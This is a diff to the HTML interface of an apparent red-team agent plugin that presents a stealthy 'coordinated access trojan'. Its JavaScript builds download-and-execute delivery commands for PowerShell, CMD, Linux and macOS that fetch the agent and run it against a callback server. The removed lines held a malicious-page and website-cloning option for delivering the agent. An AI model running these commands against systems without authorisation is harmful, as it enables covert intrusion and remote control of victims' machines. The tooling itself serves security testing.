@@ -26,60 +26,30 @@
             <div id="sandcat-blocks" class="row-canvas">
                 <div class="section-profile">
                     <div class="row">
-                        <div class="column prints" style="flex:35%">
-                            <img id="pawprint" style="filter:invert(var(--invert-percentage))" src="/sandcat/img/print.png">
-                        </div>
-                        <div class="column" style="flex:65%;text-align:left">
-                            <h1 style="margin-top:-20px;text-shadow: 5px 5px 5px var(--theme-color);">54ndc47</h1>
-                            <h2 style="margin-top:-85px">coordinated access trojan (CAT)</h2>
-                            <p style="width: 75%;font-size:14px;">
+                        <div class="column section-border" style="flex:37%;text-align:left;padding:15px;">
+                            <h1 style="text-shadow: 5px 5px 5px var(--theme-color);font-size:70px;margin-top:-20px;">54ndc47</h1>
+                            <h2 style="margin-top:-55px">coordinated access trojan (CAT)</h2>
+                            <p>
                                 A sandcat is a desert cat that leaves no footprint. In that vein,
                                 54ndc47 is an agent designed to run without detection on any host operating system.
-                                It intentionally blends into the environment and executes operations.
+                                CATs are deployed by running 1-line <i>delivery commands</i>, based on the
+                                target operating system.
                             </p>
-                            <b><p style="font-size:14px;color:gold">&#9888; Use an initial access option below to deliver the agent to target hosts.</p></b>
+                            <select id="dcommands" style="width:60%;" onchange="displayCommand()">
+                                <option disabled="disabled" selected>Select target OS</option>
+                                <option value="darwin">MacOS</option>
+                                <option value="linux">Linux</option>
+                                <option value="windows-psh">Windows (PowerShell)</option>
+                                <option value="windows-cmd">Windows (CMD)</option>
+                            </select>
+                        </div>
+                        <div class="column" style="flex:67%;padding:15px;text-align: left">
+                            <div style="background-color: var(--primary-background);padding: 15px;border-radius: 25px">
+                                <code id="delivery-command" style="text-align: left;font-size:14px;"></code>
+                            </div>
                         </div>
                     </div>
                 </div>
-
-                <!-- Access -->
-
-                <div class="section-profile">
-                    <div id="access" class="row">
-                        <div class="column section-border" style="flex:50%">
-                            <h4>Option #1</h4>
-                            <p class="paragraph">
-                                Copy and paste one of the delivery commands into a terminal window.
-                            </p>
-                            <center>
-                            <div>
-                                <label><input type="radio" name="delivery" onclick="show('windows-psh')" />PowerShell</label>
-                                <label><input type="radio" name="delivery" onclick="show('windows-cmd')" />CMD</label>
-                                <label><input type="radio" name="delivery" onclick="show('linux')" />Linux</label>
-                                <label><input type="radio" name="delivery" onclick="show('darwin')" />MacOS</label>
-                            </div>
-                            </center>
-                            <div class="delivery">
-                                <code id="delivery-command"></code>
-                            </div>
-                        </div>
-                        <div class="column malicious-link" style="flex:50%">
-                            <h4>Option #2</h4>
-                            <p class="paragraph">
-                                Have each targeted machine navigate to our malicious web page. Then start the downloaded
-                                54ndc47 agent. Use our sample malicious web page or overwrite it using the website
-                                cloning button below.
-                            </p>
-                            <a href="/plugin/sandcat/malicious" target="_blank">
-                                <img src="/sandcat/img/arrow.png"/>
-                            </a>
-                            <br>
-                            <input id="cloneNew" placeholder="Enter a url"/>
-                            <button type="button" class="button-success" onclick="cloneWebsite()">Clone</button>
-                        </div>
-                    </div>
-                </div>
-
             </div>
         </div>
         </center>
@@ -87,44 +57,31 @@
     <script src="/gui/jquery/jquery.js"></script>
     <script src="/gui/js/shared.js"></script>
     <script>
-        function show(identity) {
+        function displayCommand(){
+            let selected_option = document.getElementById("dcommands").value;
             let x = $('#delivery-command');
             let loc = location.protocol+'//'+location.hostname+(location.port ? ':'+location.port: '');
-            if(identity === 'windows-psh') {
+            if(selected_option === 'windows-psh') {
                 x.text('$url="' + loc + '/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $output="C:\\Users\\Public\\sandcat.exe";$wc.DownloadFile($url,$output); C:\\Users\\Public\\sandcat.exe -server ' + loc + ' -group my_group -v;');
-            } else if(identity === 'windows-cmd') {
+            } else if(selected_option === 'windows-cmd') {
                 x.text('$url="'+loc+'/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform", "windows"); $wc.Headers.add("file", "sandcat.go"); $output="C:\\Users\\Public\\sandcat.exe"; $wc.DownloadFile($url, $output); cmd.exe /c C:\\Users\\Public\\sandcat.exe -server '+loc+' -group my_group -executors cmd -v;')
-            } else if (identity === 'linux') {
+            } else if (selected_option === 'linux') {
                 x.text('curl -sk -X POST -H \'file:sandcat.go\' -H \'platform:linux\' '+loc+'/file/download > /tmp/sandcat-linux && chmod +x /tmp/sandcat-linux && /tmp/sandcat-linux -server '+loc+' -group my_group -v;');
-            } else if (identity === 'darwin') {
+            } else if (selected_option === 'darwin') {
                 x.text('curl -sk -X POST -H \'file:sandcat.go\' -H \'platform:darwin\' '+loc+'/file/download > /tmp/sandcat-darwin && chmod +x /tmp/sandcat-darwin && /tmp/sandcat-darwin -server '+loc+' -group my_group -v;');
             }
         }
         function actionDownload(phrase){
             $.getScript('/sandcat/js/malicious.js');
         }
-        function cloneWebsite(){
-            let _url = document.getElementById("cloneNew").value;
-            if (validURL(_url)) {
-                let section = $('#access');
-                section.prop('disabled', true).css('opacity', 0.5);
-                $.ajax({
-                url: '/plugin/sandcat/clone?url=' + _url,
-                type: 'GET',
-                success: function(data, status, options) { section.prop('disabled', false).css('opacity', 1.0); }
-                });
-            } else {
-                alert("URL format is incorrect");
-            }
-        }
-        function validURL(str) {
-            let pattern = new RegExp('^(https?:\\/\\/)?'+ // protocol
-                '((([a-z\\d]([a-z\\d-]*[a-z\\d])*)\\.)+[a-z]{2,}|'+ // domain name
-                '((\\d{1,3}\\.){3}\\d{1,3}))'+ // OR ip (v4) address
-                '(\\:\\d+)?(\\/[-a-z\\d%_.~+]*)*'+ // port and path
-                '(\\?[;&a-z\\d%_.~+=-]*)?'+ // query string
-                '(\\#[-a-z\\d_]*)?$','i'); // fragment locator
-            return !!pattern.test(str);
+        function detachPet(){
+            $.ajax({
+                url: '/plugin/sandcat/pet',
+                type: 'POST',
+                success: function(data, status, options) {
+                    flashy('pet-flash', 'New pet detached!');
+                },
+            });
         }
     </script>
 </html>
